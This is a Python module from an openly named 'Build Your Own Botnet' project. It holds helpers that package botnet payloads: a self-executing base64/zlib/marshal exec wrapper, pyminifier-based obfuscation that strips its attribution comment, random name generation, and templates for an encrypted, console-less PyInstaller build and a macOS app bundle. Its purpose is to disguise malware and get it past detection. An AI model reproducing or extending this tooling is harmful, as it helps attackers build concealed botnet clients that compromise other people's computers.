#!/usr/bin/python
# -*- coding: utf-8 -*-
'Build Your Own Botnet'

# standard library
import os
import sys
import imp
import zlib
import time
import base64
import random
import marshal
import tempfile
import subprocess

# modules
import util
import security

# globals
__Template_main  = """
if __name__ == '__main__':
    _{0} = {1}({2})
    """

__Template_plist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleDevelopmentRegion</key>
<string>English</string>
<key>CFBundleExecutable</key>
<string>{0}</string>
<key>CFBundleGetInfoString</key>
<string>{1}</string>
<key>CFBundleIconFile</key>
<string>{2}</string>
<key>CFBundleIdentifier</key>
<string>{3}</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundleName</key>
<string>{4}</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleShortVersionString</key>
<string>{5}</string>
<key>CFBundleSignature</key>
<string>????</string>
<key>CFBundleVersion</key>
<string>{6}</string>
<key>NSAppleScriptEnabled</key>
<string>YES</string>
<key>NSMainNibFile</key>
<string>MainMenu</string>
<key>NSPrincipalClass</key>
<string>NSApplication</string>
</dict>
</plist>
"""

__Template_spec = """# -*- mode: python -*-
block_cipher = pyi_crypto.PyiBlockCipher(key={key})
a = Analysis([{basename}],
             pathex=[{path}],
             binaries=[],
             datas=[],
             hiddenimports={imports},
             hookspath=[],
             runtime_hooks=[],
             excludes=['site'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name={name},
          debug=True,
          strip=False,
          upx=False,
          runtime_tmpdir=None,
          console=False, icon={icon})
"""

# main
def compress(input):
    """ 
    Zip-compress output into self-executing script

    `Requires`
    :param str input:    input code to compress

    Returns compressed output as a string

    """
    return "import zlib,base64,marshal;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9))))

def obfuscate(input):
    """ 
    Obfuscate and minimize memory footprint of output

    `Requires`
    :param str input:    input code to obfuscate

    Returns obfuscated output as a string

    """
    if os.path.isfile(input):
        input = open(input, 'r').read()
    temp = tempfile.NamedTemporaryFile(suffix='.py', delete=False)
    temp.file.write(input)
    temp.file.close()
    name = os.path.join(tempfile.gettempdir(), temp.name)
    obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-variables --replacement-length=1 {}'.format(name, name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
    obfs.wait()
    output = open(name, 'r').read().replace('# Created by pyminifier (https://github.com/liftoff/pyminifier)', '')
    os.remove(name)
    return output

def variable(length=6):
    """ 
    Generate a random alphanumeric variable name of given length

    `Optional`
    :param int length:    length of the variable name to generate

    Returns variable as a string
    
    """
    return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))

def main(function, *args, **kwargs):
    """ 
    Generate a simple code snippet to initialize a script

    if __name__ == "__main__":
        _function = Function(*args, **kwargs)

    `Required`
    :param str funciton:    function name

    `Optional`
    :param tuple args:      positional arguments
    :param dict kwargs:     keyword arguments

    Returns code snippet as a string
    
    """
    options = ', '.join(args) + str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('{') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items()) if len(kwargs) else '')
    return __Template_main.format(function.lower(), function, options)
